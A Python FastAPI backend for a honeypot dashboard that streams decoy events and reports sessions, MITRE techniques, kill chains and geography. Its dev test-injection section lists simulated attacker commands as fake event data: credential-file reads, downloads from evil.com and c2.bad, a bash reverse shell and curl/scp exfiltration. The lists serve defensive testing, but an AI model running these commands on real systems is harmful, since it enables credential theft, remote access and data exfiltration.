"""
CI/CDecoy Dashboard — Backend
FastAPI + SSE (from NATS) + REST (from TimescaleDB)

Serves the Vite-built React SPA from static/.
React Router handles client-side routing — all non-API
paths fall through to index.html.

Tables used: decoy_events (hypertable), decoy_sessions, engage_outcomes
"""

import asyncio
import json
import os
import uuid
import random
from contextlib import asynccontextmanager
from datetime import datetime, timezone, timedelta
from pathlib import Path
from typing import AsyncGenerator

import asyncpg
import nats
from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse, JSONResponse, FileResponse
from fastapi.staticfiles import StaticFiles
from sse_starlette.sse import EventSourceResponse

# ── Config ──────────────────────────────────────────
NATS_URL = os.getenv("NATS_URL", "nats://localhost:4222")
DB_DSN = os.getenv("DB_DSN", "postgresql://cicdecoy:cicdecoy@localhost:5432/cicdecoy")
NATS_SUBJECTS = os.getenv("NATS_SUBJECTS", "cicdecoy.enriched.events.>")
STATIC_DIR = Path(__file__).parent / "static"

# ── Global state ────────────────────────────────────
nc = None
db_pool = None
event_buffer: list[dict] = []
MAX_BUFFER = 500
subscribers: list[asyncio.Queue] = []
session_cache: dict[str, dict] = {}  # session_id -> {source_ip, username}

# ── Helpers ─────────────────────────────────────────
def _parse_raw(val):
    """Handle raw_data being either dict or JSON string."""
    if val is None:
        return {}
    if isinstance(val, dict):
        return val
    try:
        return json.loads(val)
    except (json.JSONDecodeError, TypeError):
        return {}


def _parse_dict(val):
    """Safely parse a value that might be dict, JSON string, or None."""
    if val is None:
        return {}
    if isinstance(val, dict):
        return val
    if isinstance(val, str):
        try:
            return json.loads(val)
        except (json.JSONDecodeError, TypeError):
            return {}
    return {}


def _json_field(val):
    """Parse a JSONB field that might be string or already-parsed."""
    if val is None:
        return []
    if isinstance(val, (list, dict)):
        return val
    try:
        return json.loads(val)
    except (json.JSONDecodeError, TypeError):
        return []


# ── NATS handler ────────────────────────────────────
async def nats_handler(msg):
    try:
        payload = json.loads(msg.data.decode())
    except (json.JSONDecodeError, UnicodeDecodeError):
        payload = {"raw": msg.data.decode(errors="replace")}

    data = _parse_dict(payload.get("data"))
    raw  = _parse_dict(payload.get("raw_data"))

    resolved_ip = (
        payload.get("source_ip")
        or payload.get("client_ip")
        or payload.get("src_ip")
        or data.get("client_ip")
        or data.get("source_ip")
        or data.get("src_ip")
        or data.get("ip")
        or raw.get("client_ip")
        or raw.get("source_ip")
        or raw.get("src_ip")
        or raw.get("ip")
    )

    resolved_user = (
        payload.get("username")
        or payload.get("user")
        or data.get("username")
        or data.get("user")
        or raw.get("username")
        or raw.get("user")
    )

    sid = payload.get("session_id")
    if sid:
        etype = payload.get("event_type", "")
        if etype in ("connection.new", "auth.success", "session.start"):
            if resolved_ip or resolved_user:
                cached = session_cache.setdefault(sid, {})
                if resolved_ip:
                    cached["source_ip"] = resolved_ip
                if resolved_user:
                    cached["username"] = resolved_user

        cached = session_cache.get(sid)
        if cached:
            if not resolved_ip and cached.get("source_ip"):
                resolved_ip = cached["source_ip"]
            if not resolved_user and cached.get("username"):
                resolved_user = cached["username"]

    if resolved_ip:
        payload["source_ip"] = resolved_ip
    if resolved_user:
        payload["username"] = resolved_user

    event = {
        "subject": msg.subject,
        "ts": datetime.now(timezone.utc).isoformat(),
        "payload": payload,
    }

    event_buffer.append(event)
    if len(event_buffer) > MAX_BUFFER:
        event_buffer.pop(0)

    dead = []
    for q in subscribers:
        try:
            q.put_nowait(event)
        except asyncio.QueueFull:
            dead.append(q)
    for q in dead:
        subscribers.remove(q)


# ── Lifecycle ───────────────────────────────────────
@asynccontextmanager
async def lifespan(app: FastAPI):
    global nc, db_pool

    try:
        db_pool = await asyncpg.create_pool(DB_DSN, min_size=2, max_size=10, timeout=10)
        async with db_pool.acquire() as conn:
            v = await conn.fetchval("SELECT version()")
            print(f"[db] Connected — {v[:60]}")
    except Exception as e:
        print(f"[db] WARNING — running without DB: {e}")
        db_pool = None

    try:
        nc = await nats.connect(NATS_URL)
        await nc.subscribe(NATS_SUBJECTS, cb=nats_handler)
        print(f"[nats] Subscribed to {NATS_SUBJECTS}")
    except Exception as e:
        print(f"[nats] WARNING — running without NATS: {e}")
        nc = None

    yield

    if nc and nc.is_connected:
        await nc.drain()
    if db_pool:
        await db_pool.close()


app = FastAPI(title="CI/CDecoy Dashboard", lifespan=lifespan)


# ── SSE: Live event stream ──────────────────────────
@app.get("/api/events/stream")
async def event_stream(request: Request):
    q: asyncio.Queue = asyncio.Queue(maxsize=100)
    subscribers.append(q)

    async def generate() -> AsyncGenerator[dict, None]:
        for ev in event_buffer[-50:]:
            yield {"event": "decoy_event", "data": json.dumps(ev)}
        try:
            while True:
                if await request.is_disconnected():
                    break
                try:
                    ev = await asyncio.wait_for(q.get(), timeout=15.0)
                    yield {"event": "decoy_event", "data": json.dumps(ev)}
                except asyncio.TimeoutError:
                    yield {"event": "ping", "data": "keepalive"}
        finally:
            if q in subscribers:
                subscribers.remove(q)

    return EventSourceResponse(generate())


# ── REST: Quick Stats ───────────────────────────────
@app.get("/api/stats")
async def get_stats():
    if not db_pool:
        return JSONResponse({
            "total_sessions": 0, "active_sessions": 0,
            "total_events": len(event_buffer), "unique_ips": 0,
            "high_sev_24h": 0, "honeytokens_triggered": 0, "kill_chains": 0,
            "db_connected": False, "nats_connected": nc is not None and nc.is_connected,
        })

    async with db_pool.acquire() as conn:
        s = await conn.fetchrow("""
            SELECT
                (SELECT COUNT(*) FROM decoy_events WHERE timestamp > NOW() - INTERVAL '24 hours') AS ev24,
                (SELECT COUNT(DISTINCT session_id) FROM decoy_events) AS total_sessions,
                (SELECT COUNT(DISTINCT session_id) FROM decoy_events
                 WHERE event_type = 'connection.new'
                   AND timestamp > NOW() - INTERVAL '1 hour'
                   AND session_id NOT IN (
                     SELECT session_id FROM decoy_events WHERE event_type = 'session.end'
                   )) AS active,
                (SELECT COUNT(DISTINCT source_ip) FROM decoy_events
                 WHERE source_ip IS NOT NULL AND source_ip::TEXT != '127.0.0.1') AS ips,
                (SELECT COUNT(*) FROM decoy_events
                 WHERE severity IN ('high','critical')
                   AND timestamp > NOW() - INTERVAL '24 hours') AS high24,
                (SELECT COUNT(*) FROM decoy_events
                 WHERE event_type = 'honeytoken.triggered') AS ht,
                (SELECT COUNT(*) FROM (
                    SELECT e.session_id
                    FROM decoy_events e,
                         jsonb_array_elements(e.mitre_techniques) AS t(tech)
                    WHERE e.source_ip::TEXT != '127.0.0.1'
                    GROUP BY e.session_id
                    HAVING COUNT(DISTINCT (t.tech->>'tactic')) >= 3
                ) kc_sub) AS kc
        """)

    return {
        "total_sessions": s["total_sessions"], "active_sessions": s["active"],
        "total_events": s["ev24"], "unique_ips": s["ips"],
        "high_sev_24h": s["high24"], "honeytokens_triggered": s["ht"],
        "kill_chains": s["kc"],
        "db_connected": True,
        "nats_connected": nc is not None and nc.is_connected,
    }


# ── REST: Sessions ──────────────────────────────────
@app.get("/api/sessions")
async def get_sessions(limit: int = 50):
    if not db_pool:
        return JSONResponse({"sessions": [], "error": "DB not connected"})

    async with db_pool.acquire() as conn:
        rows = await conn.fetch("""
            SELECT
                session_id,
                MAX(decoy_name) AS decoy_name,
                MAX(decoy_tier) AS decoy_tier,
                COALESCE(
                    MAX(source_ip)::TEXT,
                    MAX(raw_data->>'client_ip'),
                    MAX(raw_data->'data'->>'client_ip'),
                    MAX(raw_data->>'source_ip')
                ) AS source_ip,
                COALESCE(
                    MAX(raw_data->>'username'),
                    MAX(raw_data->'data'->>'username'),
                    MAX(raw_data->>'user')
                ) AS auth_username,
                MIN(timestamp) AS start_time,
                MAX(timestamp) AS end_time,
                EXTRACT(EPOCH FROM MAX(timestamp) - MIN(timestamp))::INT AS duration_seconds,
                COUNT(*) AS event_count,
                MAX(severity) AS max_severity
            FROM decoy_events
            WHERE session_id != '' AND session_id != 'system' AND session_id != 'pre-auth'
              AND (source_ip IS NULL OR source_ip::TEXT != '127.0.0.1')
            GROUP BY session_id
            ORDER BY MAX(timestamp) DESC
            LIMIT $1
        """, limit)

    sessions = []
    for r in rows:
        techs = []
        try:
            async with db_pool.acquire() as conn:
                tech_rows = await conn.fetch("""
                    SELECT DISTINCT t->>'technique_id' AS tid,
                           t->>'technique_name' AS tname,
                           t->>'tactic' AS tactic
                    FROM decoy_events,
                         jsonb_array_elements(mitre_techniques) AS t
                    WHERE session_id = $1
                      AND jsonb_array_length(mitre_techniques) > 0
                """, r["session_id"])
                techs = [{"technique_id": t["tid"], "technique_name": t["tname"], "tactic": t["tactic"]} for t in tech_rows]
        except Exception:
            pass

        tactics = list(set(t["tactic"] for t in techs if t.get("tactic")))

        sessions.append({
            "session_id": r["session_id"],
            "decoy_name": r["decoy_name"],
            "decoy_tier": r["decoy_tier"],
            "source_ip": r["source_ip"],
            "start_time": r["start_time"].isoformat() if r["start_time"] else None,
            "end_time": r["end_time"].isoformat() if r["end_time"] else None,
            "duration_seconds": r["duration_seconds"],
            "auth_username": r["auth_username"],
            "command_count": r["event_count"],
            "max_severity": r["max_severity"],
            "mitre_techniques": techs,
            "attack_phases": tactics,
            "kill_chain_detected": len(tactics) >= 3,
        })

    return {"sessions": sessions}


# ── REST: Session drill-down (no command.response) ──
@app.get("/api/sessions/{session_id}/events")
async def get_session_events(session_id: str):
    if not db_pool:
        return JSONResponse({"events": [], "error": "DB not connected"})

    async with db_pool.acquire() as conn:
        rows = await conn.fetch("""
            SELECT event_id, timestamp, event_type, severity,
                   source_ip::TEXT, source_port, raw_data,
                   mitre_techniques, tool_signatures, tags
            FROM decoy_events
            WHERE session_id = $1
              AND event_type != 'command.response'
            ORDER BY timestamp ASC
        """, session_id)

    return {
        "session_id": session_id,
        "events": [
            {
                "event_id": r["event_id"],
                "timestamp": r["timestamp"].isoformat(),
                "event_type": r["event_type"],
                "severity": r["severity"],
                "source_ip": r["source_ip"],
                "command": (_parse_raw(r["raw_data"])).get("command", (_parse_raw(r["raw_data"])).get("input", "")),
                "raw_data": _parse_raw(r["raw_data"]),
                "mitre_techniques": _json_field(r["mitre_techniques"]),
                "tool_signatures": _json_field(r["tool_signatures"]),
            }
            for r in rows
        ],
    }


# ── REST: Session replay (includes command.response) ─
@app.get("/api/sessions/{session_id}/replay")
async def get_session_replay(session_id: str):
    """Full session replay with command-response pairing and timing deltas."""
    if not db_pool:
        return JSONResponse({"events": [], "error": "DB not connected"})

    async with db_pool.acquire() as conn:
        rows = await conn.fetch("""
            SELECT event_id, timestamp, event_type, severity,
                   source_ip::TEXT, source_port, raw_data,
                   mitre_techniques, tool_signatures, tags
            FROM decoy_events
            WHERE session_id = $1
            ORDER BY timestamp ASC, event_type ASC
        """, session_id)

        summary_row = await conn.fetchrow("""
            SELECT
                MIN(timestamp) AS start_time,
                MAX(timestamp) AS end_time,
                EXTRACT(EPOCH FROM MAX(timestamp) - MIN(timestamp))::INT AS duration_seconds,
                COUNT(*) FILTER (WHERE event_type IN ('command.exec', 'command')) AS command_count,
                MAX(severity) AS max_severity,
                MAX(decoy_name) AS decoy_name,
                MAX(decoy_tier) AS decoy_tier,
                COALESCE(MAX(source_ip)::TEXT, MAX(raw_data->>'client_ip')) AS source_ip,
                COALESCE(MAX(raw_data->>'username'), MAX(raw_data->'data'->>'username')) AS username
            FROM decoy_events
            WHERE session_id = $1
        """, session_id)

        tech_rows = await conn.fetch("""
            SELECT DISTINCT t->>'technique_id' AS tid,
                   t->>'technique_name' AS tname,
                   t->>'tactic' AS tactic
            FROM decoy_events,
                 jsonb_array_elements(mitre_techniques) AS t
            WHERE session_id = $1
              AND jsonb_array_length(mitre_techniques) > 0
        """, session_id)

    events = []
    prev_ts = None
    for r in rows:
        raw = _parse_raw(r["raw_data"])
        ts = r["timestamp"]
        delta_ms = int((ts - prev_ts).total_seconds() * 1000) if prev_ts else None
        prev_ts = ts

        events.append({
            "event_id": r["event_id"],
            "timestamp": ts.isoformat(),
            "event_type": r["event_type"],
            "severity": r["severity"],
            "source_ip": r["source_ip"],
            "command": raw.get("command", raw.get("input", "")),
            "response": raw.get("response", raw.get("output", "")),
            "raw_data": raw,
            "mitre_techniques": _json_field(r["mitre_techniques"]),
            "tool_signatures": _json_field(r["tool_signatures"]),
            "delta_ms": delta_ms,
        })

    techs = [{"technique_id": t["tid"], "technique_name": t["tname"], "tactic": t["tactic"]} for t in tech_rows]
    tactics = list(set(t["tactic"] for t in techs if t.get("tactic")))

    summary = {}
    if summary_row:
        summary = {
            "start_time": summary_row["start_time"].isoformat() if summary_row["start_time"] else None,
            "end_time": summary_row["end_time"].isoformat() if summary_row["end_time"] else None,
            "duration_seconds": summary_row["duration_seconds"],
            "command_count": summary_row["command_count"],
            "max_severity": summary_row["max_severity"],
            "decoy_name": summary_row["decoy_name"],
            "decoy_tier": summary_row["decoy_tier"],
            "source_ip": summary_row["source_ip"],
            "username": summary_row["username"],
            "mitre_techniques": techs,
            "attack_phases": tactics,
            "kill_chain_detected": len(tactics) >= 3,
        }

    return {"session_id": session_id, "summary": summary, "events": events}


# ── REST: Recent events ────────────────────────────
@app.get("/api/events")
async def get_events(limit: int = 100, severity: str = None):
    if not db_pool:
        return JSONResponse({"events": [], "error": "DB not connected"})

    if severity:
        async with db_pool.acquire() as conn:
            rows = await conn.fetch("""
                SELECT event_id, timestamp, decoy_name, event_type,
                       source_ip::TEXT, severity, raw_data, mitre_techniques
                FROM decoy_events
                WHERE severity = $1
                ORDER BY timestamp DESC LIMIT $2
            """, severity, limit)
    else:
        async with db_pool.acquire() as conn:
            rows = await conn.fetch("""
                SELECT event_id, timestamp, decoy_name, event_type,
                       source_ip::TEXT, severity, raw_data, mitre_techniques
                FROM decoy_events
                ORDER BY timestamp DESC LIMIT $1
            """, limit)

    return {
        "events": [
            {
                "event_id": r["event_id"],
                "timestamp": r["timestamp"].isoformat(),
                "decoy_name": r["decoy_name"],
                "event_type": r["event_type"],
                "source_ip": r["source_ip"],
                "severity": r["severity"],
                "raw_data": _parse_raw(r["raw_data"]),
                "mitre_techniques": _json_field(r["mitre_techniques"]),
            }
            for r in rows
        ],
    }


# ── REST: MITRE technique heatmap ───────────────────
@app.get("/api/mitre")
async def get_mitre_summary():
    if not db_pool:
        return JSONResponse({"techniques": [], "error": "DB not connected"})

    async with db_pool.acquire() as conn:
        rows = await conn.fetch("""
            SELECT
                t.tech->>'technique_id' AS technique_id,
                t.tech->>'technique_name' AS technique_name,
                t.tech->>'tactic' AS tactic,
                COUNT(*) AS total,
                COUNT(DISTINCT e.source_ip) AS actors,
                MAX(e.timestamp) AS last_seen
            FROM decoy_events e,
                 jsonb_array_elements(e.mitre_techniques) AS t(tech)
            WHERE e.timestamp > NOW() - INTERVAL '7 days'
            GROUP BY t.tech->>'technique_id',
                     t.tech->>'technique_name',
                     t.tech->>'tactic'
            ORDER BY total DESC
            LIMIT 30
        """)

    return {
        "techniques": [
            {
                "technique_id": r["technique_id"],
                "technique_name": r["technique_name"],
                "tactic": r["tactic"],
                "total": r["total"],
                "actors": r["actors"],
                "last_seen": r["last_seen"].isoformat() if r["last_seen"] else None,
            }
            for r in rows
        ],
    }


# ── REST: Engage Effectiveness ──────────────────────
TACTIC_TO_ENGAGE = {
    "discovery": "EAC0004 — Pocket Litter", "credential-access": "EAC0005 — Lure",
    "lateral-movement": "EAC0014 — Network Manipulation", "execution": "EAC0006 — Behavioral Analytics",
    "persistence": "EAC0021 — Monitoring", "exfiltration": "EAC0003 — Burn Notice",
    "collection": "EAC0004 — Pocket Litter", "command-and-control": "EAC0014 — Network Manipulation",
    "privilege-escalation": "EAC0006 — Behavioral Analytics", "impact": "EAC0003 — Burn Notice",
    "defense-evasion": "EAC0006 — Behavioral Analytics", "initial-access": "EAC0005 — Lure",
    "reconnaissance": "EAC0004 — Pocket Litter",
}


@app.get("/api/engage")
async def get_engage():
    if not db_pool:
        return JSONResponse({"engage": [], "error": "DB not connected"})

    async with db_pool.acquire() as conn:
        rows = await conn.fetch("""
            SELECT
                t.tech->>'technique_id' AS tid, t.tech->>'technique_name' AS tname,
                t.tech->>'tactic' AS tactic, COUNT(*) AS times_observed,
                COUNT(DISTINCT e.session_id) AS sessions,
                COUNT(DISTINCT e.session_id) FILTER (
                    WHERE (SELECT COUNT(DISTINCT t2.tac->>'tactic')
                           FROM decoy_events e2, jsonb_array_elements(e2.mitre_techniques) AS t2(tac)
                           WHERE e2.session_id = e.session_id) >= 3
                ) AS kill_chains,
                AVG(EXTRACT(EPOCH FROM e.timestamp - (
                    SELECT MIN(e3.timestamp) FROM decoy_events e3 WHERE e3.session_id = e.session_id
                ))) AS avg_dur
            FROM decoy_events e, jsonb_array_elements(e.mitre_techniques) AS t(tech)
            WHERE e.timestamp > NOW() - INTERVAL '7 days'
            GROUP BY t.tech->>'technique_id', t.tech->>'technique_name', t.tech->>'tactic'
            ORDER BY times_observed DESC LIMIT 100
        """)

    engage = []
    for r in rows:
        tactic = r["tactic"] or "unknown"
        activity = TACTIC_TO_ENGAGE.get(tactic, "EAC0021 — Monitoring")
        dur = float(r["avg_dur"]) if r["avg_dur"] else 0
        eff = min(1.0, (dur / 300) * 0.5 + (r["kill_chains"] / max(r["sessions"], 1)) * 0.5)
        engage.append({
            "technique_id": r["tid"], "technique_name": r["tname"],
            "engage_activity": activity, "times_observed": r["times_observed"],
            "effectiveness": round(eff, 2), "last_seen": None,
        })
    return {"engage": engage}


# ── REST: Top IPs ──────────────────────────────────
@app.get("/api/top-ips")
async def get_top_ips(hours: int = 24, limit: int = 15):
    if not db_pool:
        return JSONResponse({"ips": []})
    async with db_pool.acquire() as conn:
        rows = await conn.fetch("""
            SELECT source_ip::TEXT, COUNT(*) AS events,
                   MAX(severity) AS max_severity, COUNT(DISTINCT session_id) AS sessions
            FROM decoy_events
            WHERE timestamp > NOW() - make_interval(hours => $1) AND source_ip::TEXT != '127.0.0.1'
            GROUP BY source_ip ORDER BY events DESC LIMIT $2
        """, hours, limit)
    return {"ips": [dict(r) for r in rows]}


# ── REST: Kill Chain Timelines ─────────────────────
PHASE_ORDER = [
    "reconnaissance", "resource-development", "initial-access", "execution",
    "persistence", "privilege-escalation", "defense-evasion", "credential-access",
    "discovery", "lateral-movement", "collection", "command-and-control",
    "exfiltration", "impact",
]


@app.get("/api/kill-chains")
async def get_kill_chains(limit: int = 20):
    if not db_pool:
        return JSONResponse({"sessions": [], "error": "DB not connected"})

    async with db_pool.acquire() as conn:
        rows = await conn.fetch("""
            SELECT e.session_id, MAX(e.source_ip)::TEXT AS source_ip,
                MAX(e.decoy_name) AS decoy_name, MAX(e.raw_data->>'username') AS auth_username,
                EXTRACT(EPOCH FROM MAX(e.timestamp) - MIN(e.timestamp))::INT AS duration_seconds,
                COUNT(*) FILTER (WHERE e.event_type IN ('command.exec','command')) AS command_count,
                MIN(e.timestamp) AS start_time,
                COALESCE(jsonb_agg(DISTINCT t.tech) FILTER (WHERE t.tech IS NOT NULL), '[]'::jsonb) AS mitre_techniques,
                COALESCE(array_agg(DISTINCT (t.tech->>'tactic')) FILTER (WHERE t.tech->>'tactic' IS NOT NULL), ARRAY[]::TEXT[]) AS attack_phases
            FROM decoy_events e
            LEFT JOIN LATERAL jsonb_array_elements(e.mitre_techniques) AS t(tech) ON TRUE
            WHERE e.source_ip::TEXT != '127.0.0.1'
            GROUP BY e.session_id HAVING COUNT(DISTINCT (t.tech->>'tactic')) >= 3
            ORDER BY MIN(e.timestamp) DESC LIMIT $1
        """, limit)

    results = []
    for r in rows:
        techniques = _json_field(r["mitre_techniques"])
        phases_raw = [p for p in (r["attack_phases"] or []) if p]
        phase_details = []
        for phase in PHASE_ORDER:
            if phase in phases_raw:
                techs_in_phase = [t for t in techniques if isinstance(t, dict) and t.get("tactic") == phase]
                phase_details.append({
                    "phase": phase, "index": PHASE_ORDER.index(phase),
                    "techniques": [{"id": t.get("technique_id", ""), "name": t.get("technique_name", "")} for t in techs_in_phase],
                })
        results.append({
            "session_id": r["session_id"], "source_ip": r["source_ip"],
            "auth_username": r["auth_username"], "decoy_name": r["decoy_name"],
            "duration_seconds": r["duration_seconds"], "command_count": r["command_count"],
            "start_time": r["start_time"].isoformat() if r["start_time"] else None,
            "phase_count": len(phase_details), "phases": phase_details,
        })
    return {"sessions": results}


# ── REST: Duration Histogram ───────────────────────
DURATION_BUCKETS = [
    ("0-10s", 0, 10), ("10-30s", 10, 30), ("30s-1m", 30, 60),
    ("1-5m", 60, 300), ("5-15m", 300, 900), ("15-60m", 900, 3600), ("60m+", 3600, None),
]


@app.get("/api/duration-histogram")
async def get_duration_histogram():
    if not db_pool:
        return JSONResponse({"buckets": [], "error": "DB not connected"})
    async with db_pool.acquire() as conn:
        rows = await conn.fetch("""
            SELECT EXTRACT(EPOCH FROM MAX(timestamp) - MIN(timestamp))::INT AS duration_seconds
            FROM decoy_events WHERE source_ip::TEXT != '127.0.0.1'
            GROUP BY session_id HAVING EXTRACT(EPOCH FROM MAX(timestamp) - MIN(timestamp)) > 0
            ORDER BY duration_seconds
        """)
    durations = [r["duration_seconds"] for r in rows]
    buckets = []
    for label, lo, hi in DURATION_BUCKETS:
        count = sum(1 for d in durations if (lo <= d < hi if hi else d >= lo))
        buckets.append({"label": label, "count": count, "lo": lo, "hi": hi})
    total = len(durations)
    avg = sum(durations) / total if total > 0 else 0
    median = sorted(durations)[total // 2] if total > 0 else 0
    return {"buckets": buckets, "total_sessions": total, "avg_seconds": round(avg, 1), "median_seconds": round(median, 1)}


# ── REST: Geographic Breakdown ─────────────────────
@app.get("/api/geo")
async def get_geo_breakdown(hours: int = 168):
    if not db_pool:
        return JSONResponse({"countries": [], "error": "DB not connected"})
    async with db_pool.acquire() as conn:
        rows = await conn.fetch("""
            SELECT e.geo->>'country' AS country_code, e.geo->>'country_name' AS country_name,
                COUNT(DISTINCT e.session_id) AS sessions, COUNT(DISTINCT e.source_ip::TEXT) AS unique_ips,
                SUM(CASE WHEN e.event_type IN ('command.exec','command') THEN 1 ELSE 0 END) AS total_commands,
                AVG(EXTRACT(EPOCH FROM sub.dur)) AS avg_duration
            FROM decoy_events e
            LEFT JOIN LATERAL (SELECT MAX(e2.timestamp) - MIN(e2.timestamp) AS dur FROM decoy_events e2 WHERE e2.session_id = e.session_id) sub ON TRUE
            WHERE e.geo IS NOT NULL AND e.geo->>'country' IS NOT NULL
              AND e.source_ip::TEXT != '127.0.0.1' AND e.timestamp > NOW() - make_interval(hours => $1)
            GROUP BY e.geo->>'country', e.geo->>'country_name' ORDER BY sessions DESC
        """, hours)
    return {
        "countries": [{
            "country_code": r["country_code"],
            "country_name": r["country_name"] or r["country_code"],
            "sessions": r["sessions"], "unique_ips": r["unique_ips"],
            "total_commands": r["total_commands"] or 0,
            "avg_duration": round(float(r["avg_duration"]), 1) if r["avg_duration"] else 0,
        } for r in rows],
        "period_hours": hours,
    }


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  DEV: Test event injection
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

RECON_COMMANDS = ["whoami", "id", "uname -a", "hostname", "w", "last"]
DISCOVERY_COMMANDS = ["cat /etc/passwd", "ls -la /root", "ps aux", "netstat -tlnp", "ifconfig", "cat /proc/version", "find / -name '*.pem' 2>/dev/null", "df -h", "env"]
CREDENTIAL_COMMANDS = ["cat /etc/shadow", "cat ~/.ssh/id_rsa", "cat ~/.ssh/authorized_keys", "cat ~/.aws/credentials"]
LATERAL_COMMANDS = ["ssh root@10.0.0.5", "ssh admin@192.168.1.10", "scp /tmp/data.tgz user@10.0.0.8:/tmp/"]
PERSIST_COMMANDS = ["crontab -e", "echo '* * * * * /tmp/s' >> /var/spool/cron/root", "echo 'ssh-rsa AAAA...' >> ~/.ssh/authorized_keys"]
C2_COMMANDS = ["wget http://evil.com/payload.sh", "curl http://c2.bad/s -o /tmp/s", "chmod +x /tmp/s"]
EXEC_COMMANDS = ["/tmp/s -p 4444", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", "python3 -c 'import socket; ...'"]
COLLECTION_COMMANDS = ["tar czf /tmp/data.tgz /etc", "tar czf /tmp/keys.tgz ~/.ssh", "zip -r /tmp/www.zip /var/www"]
EXFIL_COMMANDS = ["scp /tmp/data.tgz attacker@c2.bad:/loot/", "curl -X POST http://c2.bad/exfil -d @/tmp/data.tgz"]
EVASION_COMMANDS = ["unset HISTFILE", "history -c", "rm -f ~/.bash_history", "iptables -F"]
ATTACK_PHASES = [RECON_COMMANDS, DISCOVERY_COMMANDS, CREDENTIAL_COMMANDS, C2_COMMANDS, EXEC_COMMANDS, LATERAL_COMMANDS, PERSIST_COMMANDS, COLLECTION_COMMANDS, EXFIL_COMMANDS, EVASION_COMMANDS]

SAMPLE_GEOS = [
    {"country": "CN", "country_name": "China", "city": "Beijing", "latitude": 39.9, "longitude": 116.4},
    {"country": "RU", "country_name": "Russia", "city": "Moscow", "latitude": 55.7, "longitude": 37.6},
    {"country": "US", "country_name": "United States", "city": "New York", "latitude": 40.7, "longitude": -74.0},
    {"country": "DE", "country_name": "Germany", "city": "Berlin", "latitude": 52.5, "longitude": 13.4},
    {"country": "BR", "country_name": "Brazil", "city": "Sao Paulo", "latitude": -23.5, "longitude": -46.6},
    {"country": "KR", "country_name": "South Korea", "city": "Seoul", "latitude": 37.6, "longitude": 127.0},
    {"country": "IR", "country_name": "Iran", "city": "Tehran", "latitude": 35.7, "longitude": 51.4},
    {"country": "VN", "country_name": "Vietnam", "city": "Hanoi", "latitude": 21.0, "longitude": 105.8},
    {"country": "IN", "country_name": "India", "city": "Mumbai", "latitude": 19.1, "longitude": 72.9},
    {"country": "NL", "country_name": "Netherlands", "city": "Amsterdam", "latitude": 52.4, "longitude": 4.9},
]


def _make_raw_event(event_type, session_id, src_ip, username, decoy_name, ts, command="", geo=None):
    event_id = str(uuid.uuid4())[:12]
    data = {"client_ip": src_ip, "username": username}
    if command:
        data["command"] = command
        data["response"] = "..."
    return {
        "event_id": event_id, "timestamp": ts.isoformat(), "decoy_name": decoy_name,
        "decoy_tier": 2, "session_id": session_id, "event_type": event_type,
        "source_ip": src_ip, "source_port": random.randint(40000, 65000),
        "data": data, "raw_data": data, "geo": geo or random.choice(SAMPLE_GEOS),
    }


@app.post("/api/test/inject")
async def inject_test_event():
    all_commands = RECON_COMMANDS + DISCOVERY_COMMANDS + CREDENTIAL_COMMANDS + LATERAL_COMMANDS + C2_COMMANDS + EXEC_COMMANDS + COLLECTION_COMMANDS + EVASION_COMMANDS
    cmd = random.choice(all_commands)
    src_ip = f"{random.choice([198,203,45,91,185])}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
    username = random.choice(["root", "admin", "deploy", "ubuntu"])
    event = _make_raw_event("command.exec", f"sess-{random.randint(1000,9999)}", src_ip, username, random.choice(["ssh-decoy-01", "ssh-decoy-02"]), datetime.now(timezone.utc), cmd)
    subject = f"cicdecoy.decoy.events.{event['event_type']}"
    if nc and nc.is_connected:
        await nc.publish(subject, json.dumps(event).encode())
        return {"status": "published_to_nats", "event_id": event["event_id"]}
    return {"status": "error", "detail": "NATS not connected — pipeline unavailable"}


@app.post("/api/test/inject-session")
async def inject_test_session(event_count: int = 10):
    if not nc or not nc.is_connected:
        return {"status": "error", "detail": "NATS not connected — pipeline unavailable"}
    now = datetime.now(timezone.utc)
    session_id = f"test-kc-{uuid.uuid4().hex[:8]}"
    src_ip = f"{random.choice([198,203,45,91,185])}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
    decoy_name = random.choice(["ssh-decoy-01", "ssh-decoy-02"])
    geo = random.choice(SAMPLE_GEOS)
    username = random.choice(["root", "admin", "deploy", "ubuntu"])
    commands = []
    phases_to_use = random.sample(ATTACK_PHASES, min(len(ATTACK_PHASES), max(4, event_count // 2)))
    for phase_commands in phases_to_use:
        commands.append(random.choice(phase_commands))
        if len(commands) >= event_count:
            break
    while len(commands) < event_count:
        commands.append(random.choice(random.choice(ATTACK_PHASES)))
    elapsed = 0
    await nc.publish("cicdecoy.decoy.events.connection.new", json.dumps(_make_raw_event("connection.new", session_id, src_ip, username, decoy_name, now, geo=geo)).encode())
    elapsed += random.randint(1, 3)
    await nc.publish("cicdecoy.decoy.events.auth.success", json.dumps(_make_raw_event("auth.success", session_id, src_ip, username, decoy_name, now + timedelta(seconds=elapsed), geo=geo)).encode())
    for cmd in commands:
        elapsed += random.randint(2, 20)
        await nc.publish("cicdecoy.decoy.events.command.exec", json.dumps(_make_raw_event("command.exec", session_id, src_ip, username, decoy_name, now + timedelta(seconds=elapsed), cmd, geo)).encode())
    elapsed += random.randint(1, 5)
    await nc.publish("cicdecoy.decoy.events.session.end", json.dumps(_make_raw_event("session.end", session_id, src_ip, username, decoy_name, now + timedelta(seconds=elapsed), geo=geo)).encode())
    return {"status": "ok", "session_id": session_id, "events": len(commands) + 3, "source_ip": src_ip}


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  SPA Serving — Vite build output in static/
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# Mount Vite's asset directory (JS/CSS bundles)
if (STATIC_DIR / "assets").exists():
    app.mount("/assets", StaticFiles(directory=str(STATIC_DIR / "assets")), name="assets")

# Serve other static files (favicon, etc.)
if STATIC_DIR.exists():
    app.mount("/static", StaticFiles(directory=str(STATIC_DIR)), name="static")


# SPA catch-all: serve index.html for all non-API routes
# This must be registered LAST so /api/* routes take priority.
@app.get("/{full_path:path}")
async def serve_spa(full_path: str):
    """Serve the React SPA for all non-API paths (React Router handles routing)."""
    index_path = STATIC_DIR / "index.html"
    if index_path.exists():
        return FileResponse(str(index_path))
